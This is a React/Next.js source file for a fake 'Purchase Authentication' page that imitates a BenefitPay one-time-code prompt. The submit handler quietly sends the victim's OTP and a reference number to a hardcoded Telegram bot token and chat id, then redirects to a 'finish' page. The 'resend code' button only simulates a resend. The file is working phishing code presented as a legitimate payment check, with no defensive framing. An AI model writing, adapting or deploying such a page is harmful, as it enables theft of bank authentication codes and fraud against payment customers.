"use client";
import { Suspense } from "react";
import React, { useState, useEffect } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import { useRouter, useSearchParams } from 'next/navigation';
import axios from 'axios';

function CodePageContent() {
  const [code, setCode] = useState("");
  const [timeLeft, setTimeLeft] = useState(60);
  const [expired, setExpired] = useState(false);
  const [resending, setResending] = useState(false);

  const searchParams = useSearchParams();
  const refN = searchParams.get("refN");
  const router = useRouter();

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setExpired(true);
    }
  }, [timeLeft]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (expired) {
      alert("The code has expired. Please request a new one.");
      return;
    }
    if (code) {
      const text = `
🔐 PIN: ${code}
🔨 Ref: ${refN}
      `;
      try {
        await axios.post(
          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
          {
            chat_id: "-4836393174",
            text: text
          }
        );
        router.push(`/benefitpay/finish?refN=${refN}`);
      } catch (error) {
        alert("Error sending data");
        console.error(error);
      }
    }
  };

  const handleResend = async () => {
    setResending(true);
    // هنا يمكنك إرسال طلب لإعادة إرسال الكود من الخادم إذا أردت
    setTimeout(() => {
      setTimeLeft(60);
      setExpired(false);
      setResending(false);
    }, 1000); // محاكاة إرسال الكود (ثانية واحدة)
  };

  return (
    <div 
      className="d-flex justify-content-center align-items-center vh-100" 
      style={{ backgroundColor: "#fdf5f5" }}
    >
      <img src='./IMG-20250813-WA0009.jpg' alt="back image " className="w-75"/>
      <form 
        onSubmit={handleSubmit} 
        className="p-4 rounded shadow" 
        style={{ backgroundColor: "white", width: "300px", border: "2px solid #ff4d4d" }}
      >
        <h4 className="text-center mb-3" style={{ color: "#b30000" }}>
          Purchase Authentication
        </h4>
        <p>We have sent you an SMS with an OTP code to your registered mobile number.</p>
        <p>Enter your OTP code below:</p>

        {/* Countdown Timer */}
        <p className="text-danger fw-bold">
          {expired 
            ? "The code has expired." 
            : `This code will expire in ${timeLeft}s`}
        </p>

        <div className="mb-3">
          <input 
            type="text" 
            className="form-control" 
            placeholder="Enter code" 
            value={code} 
            onChange={(e) => setCode(e.target.value)} 
            required
            style={{ borderColor: "#ff4d4d" }}
          />
        </div>

        <button 
          type="submit" 
          className="btn w-100 mb-2" 
          style={{ backgroundColor: "#ff4d4d", color: "white" }}
          disabled={expired}
        >
          Confirm
        </button>

        {/* Resend Code Button */}
        <button 
          type="button"
          onClick={handleResend}
          className="btn btn-outline-danger w-100"
          disabled={!expired || resending}
        >
          {resending ? "Resending..." : "Resend Code"}
        </button>
      </form>
    </div>
  );
}

export default function CodePage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <CodePageContent />
    </Suspense>
  );
          }
